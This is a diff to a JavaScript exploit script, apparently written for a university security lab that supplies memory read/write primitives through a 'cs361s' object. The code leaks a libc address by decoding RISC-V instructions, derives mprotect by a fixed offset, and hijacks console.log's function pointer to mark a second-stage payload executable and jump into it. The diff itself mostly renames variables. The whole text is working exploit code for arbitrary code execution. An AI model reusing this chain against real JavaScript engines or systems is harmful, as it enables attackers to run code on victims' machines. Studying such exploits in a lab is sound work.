@@ -19,16 +19,16 @@ let second_stage =
 let addressconsole = cs361s.addrof(console.log);
 let ctx = cs361s.readmem(addressconsole + 48);
 let rt = cs361s.readmem(ctx + 24);
-let mf_js_malloc_offset = cs361s.readmem(rt + 24);
+let jsMallocUsableSize = cs361s.readmem(rt + 24);
 
 // auipc offset (top 20 is immediate)
-let aupic_offset = cs361s.readmem(mf_js_malloc_offset) >>> 12 << 12;
+let aupic_offset = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12;
 // ld offset (top 12 is immediate)
-let ld_offset = cs361s.readmem(mf_js_malloc_offset + 4) >> 20;
-// we now have libc pointer to malloc_usable_size
-let got_entry = cs361s.readmem(mf_js_malloc_offset + aupic_offset + ld_offset);
-// now get mprotect address
-let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect
+let ld_offset = cs361s.readmem(jsMallocUsableSize + 4) >> 20;
+//get address of malloc usable size
+let mallocUsableSizeAddress = cs361s.readmem(jsMallocUsableSize + aupic_offset + ld_offset);
+//get address of mprotect by decrementing malloc usable size address
+let addressmprotect = mallocUsableSizeAddress - 0x31B00; 
 
 /* Populate with Second Stage Payload
  * Either mark the page that holds the second_stage string rwx or 
@@ -37,13 +37,13 @@ let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect
  * Find where the second stage payload even is
  * look at text segment 
  */
-let second_stage_addr = cs361s.addrof(second_stage);
+let secondstageaddress = cs361s.addrof(second_stage);
 
-let old_realm = cs361s.readmem(addressconsole + 48);
-cs361s.writemem(addressconsole + 48, second_stage_addr); // overwrite realm
-cs361s.writemem(addressconsole + 56, mprotect_addr);
+//let old_realm = cs361s.readmem(addressconsole + 48);
+cs361s.writemem(addressconsole + 48, secondstageaddress); // overwrite realm
+cs361s.writemem(addressconsole + 56, addressmprotect);
 console.log.apply(2.0237e-320, null); // rwx
 // Execute Payload
-cs361s.writemem(addressconsole + 48, old_realm); // restore realm
-cs361s.writemem(addressconsole + 56, second_stage_addr + 16); // start of string + 16 HAHAHAHAHHAHAHA
+//cs361s.writemem(addressconsole + 48, old_realm); // restore realm
+cs361s.writemem(addressconsole + 56, secondstageaddress + 16); // start of string + 16 HAHAHAHAHHAHAHA
 console.log();
